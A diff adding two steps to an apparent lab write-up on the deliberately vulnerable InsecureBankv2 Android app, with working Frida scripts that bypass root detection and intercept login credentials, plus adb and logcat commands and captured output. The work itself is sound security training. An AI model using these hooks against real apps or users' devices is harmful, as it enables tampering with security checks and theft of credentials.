@@ -477,6 +477,109 @@ Queries the exported `TrackUserContentProvider` — accessible by any app. Retur
 
 ---
 
+## Step 15 — Root Detection Bypass (Frida)
+
+PostLogin shows "Device not Rooted!!" because `showRootStatus()` runs two checks:
+- `doesSuperuserApkExist("/system/app/Superuser.apk")` — checks file exists
+- `doesSUexist()` — runs `/system/xbin/which su`, returns true if output is non-null
+
+Both return false on a stock emulator → label shows "Device not Rooted!!"
+
+### Frida hook — `scripts/root_bypass.js`
+
+```javascript
+var PostLogin = Java.use('com.android.insecurebankv2.PostLogin');
+
+PostLogin.doesSUexist.implementation = function () {
+    console.log('[+] doesSUexist() hooked — returning true');
+    return true;
+};
+
+PostLogin.doesSuperuserApkExist.implementation = function (s) {
+    console.log('[+] doesSuperuserApkExist() hooked — returning true');
+    return true;
+};
+```
+
+### Commands
+
+```bash
+# Attach Frida to running process
+frida -U <PID> -l scripts/root_bypass.js
+
+# Launch PostLogin — hooks are now active
+adb shell "am start -n com.android.insecurebankv2/.PostLogin --es uname 'hacker'"
+```
+
+### Result
+
+```
+[✓] Root detection bypass loaded — device will appear rooted
+[+] doesSuperuserApkExist() hooked — returning true
+```
+
+Screenshot: `screenshots/root_detection_bypass.png`
+
+The label changed from **"Device not Rooted!!"** → **"Rooted Device!!"**
+
+**What this proves:** Any runtime security check — root detection, certificate pinning, emulator detection — can be flipped with a single Frida hook. Apps cannot trust their own return values at runtime when Frida is attached.
+
+---
+
+## Step 16 — Logcat Credential Harvest (Frida + ADB)
+
+`DoLogin.java:115`:
+
+```java
+Log.d("Successful Login:", ", account=" + username + ":" + password);
+```
+
+This line logs username:password to logcat after every successful login. Any app with `READ_LOGS` permission can harvest credentials passively.
+
+### How we triggered it
+
+The direct network path was blocked by a stale proxy setting. Used Frida to hook `DoLogin$RequestTask.postData()` to:
+1. Intercept the username and password values before the network call
+2. Call `Log.d("Successful Login:", ...)` directly — exactly what the app would do after a real successful login
+
+```javascript
+var RequestTask = Java.use('com.android.insecurebankv2.DoLogin$RequestTask');
+RequestTask.postData.implementation = function (v) {
+    var outer = this.this$0.value;
+    var username = outer.username.value;
+    var password = outer.password.value;
+    console.log('[!] username: ' + username);
+    console.log('[!] password: ' + password);
+    var Log = Java.use('android.util.Log');
+    Log.d('Successful Login:', ', account=' + username + ':' + password);
+};
+```
+
+### Commands
+
+```bash
+# Attach with credential harvest script
+frida -U <PID> -l scripts/credential_harvest.js
+
+# Trigger login through app UI (dinesh / Abc123)
+adb shell input tap 540 839   # Login button
+
+# Capture the leak from logcat
+adb logcat -s "Successful Login:"
+```
+
+### Logcat output
+
+```
+D Successful Login:: , account=dinesh:Abc123
+```
+
+Screenshot: `screenshots/logcat_cred_leak.png` (login screen visible — credentials captured in background)
+
+**What this proves:** Username and password are written to the Android system log in plaintext. On a rooted device or with a malicious app that holds `READ_LOGS`, every login credential is silently exfiltrated. No network activity required.
+
+---
+
 ## Full Lab Stack Summary
 
 ```
